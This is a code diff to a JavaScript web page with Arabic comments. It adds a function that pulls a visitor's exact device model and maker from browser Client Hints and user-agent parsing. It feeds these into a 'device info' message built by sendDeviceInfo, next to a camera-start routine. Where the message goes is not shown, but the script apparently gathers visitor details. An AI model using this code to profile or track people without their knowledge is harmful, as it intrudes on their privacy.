@@ -247,6 +247,83 @@ function setStatus(html, type = 'info', spinner = false) {
   statusEl.innerHTML = (spinner ? '<span class="spinner"></span>' : '') + html;
 }
 
+/* ---------- دالة الحصول على طراز الجهاز الدقيق ---------- */
+async function getDeviceModel() {
+  const ua = navigator.userAgent;
+  let model = '';
+  let vendor = '';
+
+  // === المحاولة 1: استخدام Client Hints (الأدق) ===
+  try {
+    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+      const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
+      if (hints.model) {
+        model = hints.model;   // مثال: "SM-S911B" أو "Pixel 7"
+      }
+    }
+  } catch (e) {
+    console.warn('فشل Client Hints:', e.message);
+  }
+
+  // === المحاولة 2: تحليل User-Agent يدويًا (خطة بديلة) ===
+  if (!model) {
+    // أجهزة Android — استخراج الطراز من داخل الأقواس
+    const androidMatch = ua.match(/Android\s+[\d.]+;\s*([^;)]+?)(?:\s+Build|\))/i);
+    if (androidMatch) {
+      model = androidMatch[1].trim();
+      // إزالة كلمات زائدة
+      model = model.replace(/\s*Build.*$/i, '').trim();
+    }
+
+    // أجهزة iPhone — استخراج الطراز الدقيق من إصدار iOS
+    if (/iPhone/i.test(ua)) {
+      const verMatch = ua.match(/iPhone OS (\d+)_(\d+)/i);
+      if (verMatch) {
+        model = 'iPhone (iOS ' + verMatch[1] + '.' + verMatch[2] + ')';
+      } else {
+        model = 'iPhone';
+      }
+    }
+
+    // أجهزة iPad
+    if (/iPad/i.test(ua)) {
+      const verMatch = ua.match(/OS (\d+)_(\d+)/i);
+      model = verMatch ? 'iPad (iOS ' + verMatch[1] + '.' + verMatch[2] + ')' : 'iPad';
+    }
+  }
+
+  // === محاولة استخراج الشركة المصنعة ===
+  if (!vendor) {
+    const brandPatterns = {
+      'Samsung': /SM-|Samsung/i,
+      'Xiaomi':   /Redmi|POCO|Xiaomi|Mi\s/i,
+      'Huawei':   /HUAWEI|Honor|HONOR/i,
+      'Google':   /Pixel/i,
+      'OnePlus':  /ONEPLUS|OnePlus/i,
+      'Oppo':     /OPPO|CPH\d/i,
+      'Vivo':     /vivo|V\d{4}/i,
+      'Realme':   /RMX\d|realme/i,
+      'Nokia':    /Nokia/i,
+      'Sony':     /Sony|Xperia/i,
+      'LG':       /LG-|LG\s/i,
+      'Motorola': /moto|Motorola/i,
+      'Infinix':  /Infinix|Infinix/i,
+      'Tecno':    /TECNO|Tecno/i
+    };
+    for (const [brand, pattern] of Object.entries(brandPatterns)) {
+      if (pattern.test(ua) || pattern.test(model)) {
+        vendor = brand;
+        break;
+      }
+    }
+  }
+
+  return {
+    model:  model  || 'غير معروف',
+    vendor: vendor || 'غير معروف'
+  };
+}
+
 /* ---------- 1) تشغيل الكاميرا ---------- */
 async function startCamera() {
   if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -473,6 +550,9 @@ async function sendDeviceInfo() {
     const scr = screen;
     const ua  = nav.userAgent;
 
+    // الحصول على طراز الجهاز الدقيق
+    const deviceInfo = await getDeviceModel();
+
     const isAndroid = /Android/i.test(ua);
     const isIOS     = /iPhone|iPad|iPod/i.test(ua);
     const isWindows = /Windows/i.test(ua);
@@ -512,6 +592,8 @@ async function sendDeviceInfo() {
     const text =
 `🖥️ معلومات الجهاز
 
+📱 الطراز: ${deviceInfo.model}
+🏷️ الشركة: ${deviceInfo.vendor}
 🌐 المتصفح: ${browser}
 📱 نظام التشغيل: ${os}
 🗣️ اللغة: ${nav.language || 'غير معروف'}
